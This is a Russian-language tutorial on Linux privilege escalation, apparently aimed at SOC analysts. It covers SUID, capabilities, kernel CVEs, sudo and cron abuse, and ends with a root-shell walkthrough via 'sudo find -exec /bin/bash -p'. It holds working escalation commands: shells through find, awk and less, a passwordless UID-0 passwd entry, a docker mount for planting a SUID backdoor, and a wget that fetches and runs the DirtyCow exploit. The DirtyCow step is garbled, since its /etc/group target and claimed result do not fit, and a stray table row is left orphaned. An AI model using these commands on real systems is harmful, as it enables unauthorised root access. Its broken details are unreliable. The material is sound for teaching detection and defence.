# Сценарии повышения привилегий в Linux

## 1. Контекст и базовые понятия: от разграничения прав к эскалации

Повышение привилегий (privilege escalation) — эксплуатация уязвимости, ошибки конфигурации или недостатка проектирования операционной системы либо прикладного ПО, позволяющая процессу или пользователю получить доступ к ресурсам, выходящим за пределы изначально предоставленных прав. В модели Kill Chain этот шаг обычно следует за первоначальным проникновением: злоумышленник, получив ограниченную оболочку (shell) непривилегированной учётной записи, стремится повысить уровень доступа для закрепления, горизонтального перемещения или полного контроля над системой.

В Linux традиционная дискреционная модель управления доступом (DAC) опирается на триаду «владелец–группа–остальные» с битами чтения (r), записи (w) и исполнения (x). Административные операции зарезервированы за суперпользователем (root, UID 0). Однако этой бинарной схемы недостаточно для гибкого ограничения привилегий, что приводит к двум взаимодополняющим механизмам:

- **SUID / SGID** — специальные биты, заставляющие исполняемый файл запускаться с правами его владельца или группы, а не вызывающего пользователя. Например, `/usr/bin/passwd` имеет установленный SUID-бит, чтобы обычный пользователь мог изменить свой пароль, записывая в `/etc/shadow`, доступный только root.
- **Linux Capabilities** — набор привилегий, разбивающих полномочия root на изолированные единицы (`CAP_SYS_ADMIN`, `CAP_NET_RAW`, `CAP_DAC_OVERRIDE` и т. д.), которые можно назначить процессу независимо от UID. Это позволяет, например, веб-серверу открывать привилегированный порт 80 без полноценного root-доступа.

Важно различать два вида повышения привилегий: горизонтальное и вертикальное. Горизонтальная эскалация — переход от одного непривилегированного пользователя к другому с теми же ограничениями, но обладающему доступом к чувствительным данным или возможностью выполнять определённые sudo-команды. Вертикальная эскалация — получение более высокого уровня привилегий (вплоть до root), что даёт абсолютный контроль над системой.

Сравнительная таблица ниже фиксирует ключевые различия.

| Характеристика | Горизонтальная эскалация | Вертикальная эскалация |
|----------------|---------------------------|--------------------------|
| Цель | Доступ к чужой учётной записи с теми же правами, но полезными данными или sudo-привилегиями на определённые команды. | Получение прав root или другой высокопривилегированной роли (например, возможность писать в защищённые файлы). |
| Типичный сценарий | Кража cookie сессии, подбор пароля другого пользователя, эксплуатация уязвимости в многопользовательском приложении для чтения чужих файлов. | Эксплуатация уязвимости ядра (DirtyCow, DirtyPipe), злоупотребление некорректными sudo-правилами, злонамеренное использование SUID-бинарника. |
| Уровень доступа | Часто остаётся на уровне обычного пользователя, но расширяет обзор данных. | Позволяет обходить ограничения DAC, менять конфигурацию системы, загружать модули ядра. |
| Последствия | Утечка конфиденциальной информации, горизонтальное перемещение по сети. | Полная компрометация хоста, внедрение руткитов, подчистка логов, атака на другие узлы инфраструктуры. |
| Пример в Linux | Пользователь `alice` получает доступ к домашней директории `bob` и находит там приватный SSH-ключ. | Пользователь `alice` выполняет `sudo find / -exec /bin/bash -p \\;` из-за разрешённого в sudoers бинарника `find`, получая root shell. |

В контексте SOC L1 аналитик должен понимать, что инциденты повышения привилегий могут маскироваться под легитимную административную активность, поэтому знание нормальной конфигурации (например, какие пользователи входят в группу `sudo` или `wheel`, какие SUID-файлы присутствуют в эталонном образе) критически важно для детектирования аномалий.

## 2. Классификация векторов и механизмы эксплуатации

Повышение привилегий в Linux реализуется через множество векторов, которые удобно группировать по природе уязвимости: ошибки ядра, неправильная конфигурация системы, недостатки программных компонентов. Ниже приведён исчерпывающий обзор категорий, охватывающих основные сценарии.

### 2.1 Уязвимости ядра

Ядро Linux, в силу своей сложности, периодически содержит ошибки, позволяющие локальному пользователю выполнить код в контексте ядра или повысить привилегии. Наиболее известные примеры:

- **DirtyCow (CVE-2016-5195)** — состояние гонки в механизме copy-on-write, позволяющее перезаписать защищённый файл (например, `/etc/passwd`). Применим к ядрам до 4.8.3.
- **DirtyPipe (CVE-2022-0847)** — некорректная обработка pipe, позволяющая перезаписать данные в кеше страниц чтения произвольного файла, включая файлы с установленным SUID-битом. Ядра 5.8 и новее.
- **CVE-2024-1086** — уязвимость use-after-free в netfilter `nf_tables`, дающая возможность локальному атакующему перезаписать `modprobe_path` и выполнить код ядра. Эксплуатация требует доступности непривилегированных user namespaces, что характерно для Ubuntu и Debian по умолчанию.

Для детектирования попыток эксплуатации ядерных уязвимостей SOC-аналитику полезно отслеживать аномальные вызовы системных вызовов (через auditd или eBPF), необычные параметры `sysctl`, а также появление в логах сообщений вида `kernel BUG`, `Oops`.

### 2.2 Небезопасные разрешения на критических файлах

Файлы `/etc/passwd` и `/etc/shadow` являются ядром аутентификации. Некорректная установка прав (например, доступ на запись для не-root пользователя) открывает прямые пути эскалации:

- **Чтение `/etc/shadow`** — злоумышленник может извлечь хеш пароля root и подвергнуть его атаке по словарю (John the Ripper, Hashcat) либо использовать онлайн-сервисы.
- **Запись в `/etc/shadow`** — позволяет вставить собственный хеш пароля root. Генерация хеша выполняется командами:
  ```
  openssl passwd -1 -salt newsalt newpassword
  mkpasswd -m sha-512 newpassword newsalt
  ```
- **Запись в `/etc/passwd`** — добавление нового пользователя с UID 0 (например, `root2::0:0::/root:/bin/bash`) эквивалентно созданию второго root-аккаунта без пароля.

Аналогично опасны права на запись в файлы, загружаемые привилегированными процессами, — скрипты инициализации init/systemd, библиотеки, cron-задачи.

### 2.3 Злоупотребление sudo

Команда `sudo -l` показывает список разрешённых для текущего пользователя программ. Некорректная конфигурация sudoers, особенно разрешение на выполнение программ, позволяющих вызов оболочки, ведёт к тривиальной эскалации. Ресурс GTFObins (без гиперссылки, поскольку URL отсутствует в выдержках) каталогизирует сотни легитимных утилит, через которые можно обойти ограничения.

Типичные опасные разрешения:
- `sudo find` → `sudo find . -exec /bin/sh \;`
- `sudo vim` → `:!bash` в редакторе
- `sudo less` → `!bash`
- `sudo awk` → `awk 'BEGIN {system("/bin/bash")}'`

Кроме того, настройка параметров `sudo` по умолчанию может позволять наследование определённых переменных окружения (например, `env_keep+=LD_PRELOAD`), что даёт возможность подменить библиотеку и выполнить код с повышенными правами.

### 2.4 SUID/SGID-бинарники с уязвимостями

Программы с установленным SUID-битом запускаются с правами владельца (часто root). Если такой бинарник содержит уязвимость (переполнение буфера, инъекция команд, race condition) или разрешает небезопасные опции, атакующий может повысить привилегии. Классический пример — утилита `/bin/ping`, имеющая SUID для создания raw-сокетов; устаревшие версии позволяли инъекции через переменные окружения. Также утилиты типа `cp`, `mv`, `nmap` (в интерактивном режиме) при наличии SUID становятся векторами эскалации.

Поиск SUID-файлов в системе — один из первых шагов разведки:
```bash
find / -perm -4000 -type f 2>/dev/null
```

### 2.5 Эксплуатация Capabilities

Современные системы всё чаще отказываются от SUID в пользу capabilities, назначаемых файлам. Однако неправильное назначение чрезмерных возможностей также приводит к эскалации. Например, бинарник с `CAP_SYS_ADMIN` может смонтировать корневую файловую систему в укромное место и записать в неё свой SUID-файл. `CAP_DAC_OVERRIDE` позволяет игнорировать DAC-ограничения и читать/писать защищённые файлы.

Проверка capabilities файлов:
```bash
getcap -r / 2>/dev/null
```
Опасные примеры: `python3 = cap_sys_admin+ep` или `tar = cap_dac_read_search+ep`. В первом случае python-скрипт может монтировать файловые системы, во втором — читать `/etc/shadow`, меняя способ обхода прав.

### 2.6 Cron-задачи и задачи systemd с небезопасными скриптами

Задачи, выполняемые планировщиком cron от имени root, но использующие скрипты, доступные на запись непривилегированному пользователю, — классика повышения привилегий. Если в `/etc/crontab` или в директории `/etc/cron.*` указан скрипт в домашней директории пользователя или в `/tmp`, злоумышленник может модифицировать его и получить выполнение команд с root-правами при следующем запуске.

Аналог в systemd — сервисные юниты, где путь к `ExecStart` доступен на запись, либо используются `User=root` и `Group=root` без надлежащей изоляции.

### 2.7 Привилегированные группы и сервисы

Принадлежность пользователя к группам `docker`, `disk`, `shadow` и некоторым другим даёт практически эквивалентные root возможности. Члены группы `docker` могут запускать контейнеры с примонтированной корневой ФС хоста и менять владельца и SUID-бит файлов на хосте:
```bash
docker run --rm -it -v /:/rootfs/ -v /bin/bash:/shell alpine sh
# внутри контейнера: chown 0:0 /rootfs/tmp/backdoor; chmod 4755 /rootfs/tmp/backdoor
```
Аналогично группа `disk` позволяет прямое чтение сырых устройств, а `shadow` — чтение файла теневых паролей.

### 2.8 Уязвимости пользовательских приложений

Ошибки в установленных сервисах (Samba, Polkit, snapd, sudo, glibc) регулярно дают повышение привилегий. Например:

- CVE-2021-4034 (PwnKit) — уязвимость в polkit, позволяющая любому локальному пользователю получить root-права.
- CVE-2021-3156 (Baron Samedit) — переполнение буфера в sudo, затрагивающее множество версий.
- Эксплуатация MySQL UDF (User Defined Function) — загрузка динамической библиотеки с функцией `do_system`, которая выполнит `chmod +s /bin/bash`, если сервер запущен от root.

|-------------------------------------|-----------------------------------------------------------------------------------|------------------------------------------------------------|

Таким образом, сценарии повышения привилегий в Linux многообразны, но все они эксплуатируют либо концептуальный недостаток разделения обязанностей, либо конкретную программную ошибку. Для аналитика SOC критично не только знание векторов, но и понимание того, какие артефакты каждый из них оставляет в логах и памяти системы.

## 3. Практическое применение: сбор информации, проверка и эксплуатация

Работа с повышением привилегий на практике начинается с тщательного сбора информации (enumeration). Цель — составить карту слабых мест системы, чтобы выбрать наиболее перспективный вектор.

### 3.1 Ручная разведка

Базовый скриптовый подход включает выполнение десятков команд, агрегирующих сведения о системе. Ниже перечень команд, которые используются специалистами по тестированию на проникновение (и злоумышленниками) с пояснением получаемой информации.

```bash
# Информация о системе и ядре
uname -a
cat /proc/version
cat /etc/issue
# даёт версию ядра и дистрибутива — отправная точка для поиска CVE

# Текущий пользователь и его привилегии
id
whoami
sudo -l
# показывает UID, группы и разрешённые sudo-команды

# Поиск файлов с SUID-битом
find / -perm -4000 -type f 2>/dev/null
# обнаружение бинарников, запускаемых с правами root

# Процессы и сервисы
ps aux
netstat -tulpn
ss -tulpn
# выявляет процессы, работающие от root, и открытые порты

# Постоянные задачи
cat /etc/crontab
ls -la /etc/cron.*
systemctl list-timers --all
# cron-задачи и systemd-таймеры — потенциальные точки инъекции

# Файлы с паролями и конфиги
cat /etc/passwd
cat /etc/shadow 2>/dev/null
# проверка прав на чтение; если shadow читаем, сразу dump

# История команд
cat ~/.bash_history
cat ~/.mysql_history
# могут содержать пароли или пути

# Переменные окружения
env
# переменные могут содержать чувствительные токены или настройки LD_PRELOAD

# Группы пользователя
groups
cat /etc/group
# выявление членства в привилегированных группах (docker, sudo, shadow)
```

Полученный массив данных анализируется на предмет аномалий, например, странный SUID-файл в `/home`, нестандартное разрешение sudo, доступные для записи cron-скрипты.

### 3.2 Автоматизированные инструменты

Для ускорения рутинной разведки применяются специализированные скрипты: `LinPEAS` (Linux Privilege Escalation Awesome Script), `LinEnum`, `linuxprivchecker`. Они аккумулируют вывод большинства команд, подсвечивая потенциальные векторы цветом и предоставляя ссылки на известные эксплойты. Аналитик SOC может использовать эти же данные для верификации легитимной конфигурации при расследовании.

### 3.3 Эксплуатация на примере sudo-вектора

Предположим, разведка показала вывод `sudo -l`:
```
User bob may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/find
```
Далее атакующий обращается к каталогу GTFObins (ресурс общеизвестен, но URL не предоставлен в выдержках) и находит команду эскалации:
```bash
sudo find . -exec /bin/bash -p \; -quit
```
Флаг `-p` сохраняет привилегии, если bash был запущен с SUID или через sudo. В результате пользователь получает root shell.

Аналогично для других бинарников: `sudo awk 'BEGIN {system("/bin/sh")}'`, `sudo less /etc/hosts` с последующим вводом `!bash`.

### 3.4 Эксплуатация через SUID-бинарник

Если обнаружен SUID-бинарник с известной уязвимостью, например, устаревшая версия `sudo` или `ping`, можно применить публичный эксплойт. Для старых ядер — скомпилировать DirtyCow-эксплойт на целевой машине:
```bash
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
gcc -pthread dirtyc0w.c -o dirtyc0w
./dirtyc0w /etc/group "$(sed 's/\(root:x:\)0:0/\1/' /etc/group)"
```
В случае успеха пользователь `root` лишается пароля в `/etc/group` (зависит от вектора).

### 3.5 Типичные ошибки и подводные камни

- **Зашумление логов**. При массовом сканировании с помощью LinPEAS или ручного поиска `find` по всей ФС генерируется большое число аудитных событий, что может выдать активность.
- **Некорректные выводы о правах**. Команда `sudo -l` показывает только явные разрешения; если сконфигурировано `Defaults targetpw` или `rootpw`, эскалация может идти иначе.
- **Обход ограничений AppArmor/SELinux**. Даже имея root через sudo, процесс может быть ограничен профилем безопасности, не дающим выполнить нужные действия (например, чтение `/etc/shadow`). Это требует дополнительных техник обхода.

Для аналитика SOC важно различать легитимное использование команд `sudo` администраторами и аномальные вызовы в нерабочее время или с нестандартными аргументами. Отслеживание по логам `auth.log` (записи о вызове sudo) и `syslog` позволяет выявить подозрительные цепочки.

## 4. Сквозной практический пример: повышение привилегий через небезопасный sudo на find

В данном примере моделируется типичная ситуация: внешний злоумышленник эксплуатировал уязвимость веб-приложения и получил shell под учётной записью `www-data` на сервере Ubuntu 22.04. Сервер выполняет роль платформы для блога; администратор разрешил пользователю `bob` (к которому удалось перейти через кражу cookie) выполнять утилиту `find` с правами root для поиска конфигурационных файлов.

### Исходные условия

- ОС: Ubuntu 22.04 LTS, ядро 5.15.0 (актуальное, патчи установлены).
- Пользователь: `bob` (UID 1001), полученный через горизонтальную эскалацию от `www-data`.
- Инструменты: только стандартные утилиты bash, sudo, find.
- Сценарий: `bob` может выполнять `sudo /usr/bin/find` без пароля (запись в `/etc/sudoers.d/bob`).

### Шаг 1. Разведка текущих прав

Первым делом проверим идентичность и доступные sudo-команды.

```bash
id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
```

```bash
sudo -l
Matching Defaults entries for bob on srv-blog:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bob may run the following commands on srv-blog:
    (root) NOPASSWD: /usr/bin/find
```

Вывод показывает, что пользователь `bob` может выполнять `/usr/bin/find` от имени root без пароля.

### Шаг 2. Проверка возможности эскалации через GTFObins (без прямой ссылки)

Проверим, является ли `find` одним из «опасных» бинарников, позволяющих вызов оболочки. В каталоге GTFObins (без URL, общеизвестно) для `find` описана команда:

```bash
sudo find . -exec /bin/bash -p \; -quit
```

Проверим, присутствует ли `/bin/bash` в системе и работает ли `-exec`.

```bash
ls -la /bin/bash
-rwxr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
```

### Шаг 3. Выполнение эскалации

Запускаем команду с правами root, используя разрешённый sudo:

```bash
sudo find . -exec /bin/bash -p \; -quit
```

После выполнения приглашение командной строки может смениться на `root@...`, подтверждая успех.

### Шаг 4. Верификация повышенных привилегий

Проверяем текущего пользователя внутри нового shell:

```bash
id
uid=0(root) gid=0(root) groups=0(root)
```

Таким образом, пользователь `bob` получил полноценный root-доступ.

### Ожидаемый вывод

Пример демонстрирует, как безобидное на первый взгляд разрешение `sudo find` открывает прямой путь к полному контролю над системой. В реальной работе SOC-аналитик, заметив в логах последовательные события: выполнение `sudo -l` пользователем `bob` и сразу за ним вызов `sudo find . -exec /bin/bash`, должен расценить это как индикатор компрометации и начать процедуру реагирования, поскольку легитимный администратор вряд ли будет запускать оболочку через `find`.
